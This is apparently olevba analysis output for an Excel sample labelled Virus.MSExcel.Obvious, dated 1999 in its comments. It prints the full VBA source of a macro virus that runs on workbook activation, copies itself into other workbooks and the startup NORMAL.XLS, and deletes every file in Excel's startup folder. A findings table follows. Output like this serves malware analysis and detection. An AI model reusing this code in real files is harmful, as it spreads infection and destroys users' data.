olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Obvious-f22f5cac433826c26c70800d0a2f668571b91910
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: Virus.MSExcel.Obvious-f22f5cac433826c26c70800d0a2f668571b91910 - OLE stream: '_VBA_PROJECT_CUR/VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'EcHa original viruses code
'This code written by Reza Pc 212 v1.0
'for all stupid jerk - all my baby cool
'15 November 1999

Private Sub Infected()
    Dim NT, ID, CM As String
    Dim AW, TW, OBJ As Object
    On Error Resume Next
    Let ID = "'15 November 1999"
    Let NT = "NORMAL.XLS"
    Let CM = "ThisWorkbook"
    Set AW = ActiveWorkbook.VBProject.VBComponents(CM).CodeModule
    Set TW = ThisWorkbook.VBProject.VBComponents(CM).CodeModule
    If Dir(Application.StartupPath + "\" + NT) <> NT Then
        ThisWorkbook.SaveAs FileName:=Application.StartupPath + "\" + NT, _
                            FileFormat:=xlNormal, AddToMru:=False
    End If
    If TW.Lines(4, 1) <> ID Then
        TW.DeleteLines 1, TW.CountOfLines
        TW.InsertLines 1, AW.Lines(1, AW.CountOfLines)
    End If
    If AW.Lines(4, 1) <> ID Then
        AW.DeleteLines 1, AW.CountOfLines
        AW.InsertLines 1, TW.Lines(1, TW.CountOfLines)
    End If
    Kill Application.StartupPath + "\*.*"
End Sub
Private Sub Workbook_Deactivate()
    Infected
End Sub
Private Sub Workbook_Activate()
    Infected
End Sub


















-------------------------------------------------------------------------------
VBA MACRO Sheet1.cls 
in file: Virus.MSExcel.Obvious-f22f5cac433826c26c70800d0a2f668571b91910 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet2.cls 
in file: Virus.MSExcel.Obvious-f22f5cac433826c26c70800d0a2f668571b91910 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet3.cls 
in file: Virus.MSExcel.Obvious-f22f5cac433826c26c70800d0a2f668571b91910 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet3'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Workbook_Activate   |Runs when the Excel Workbook is opened       |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

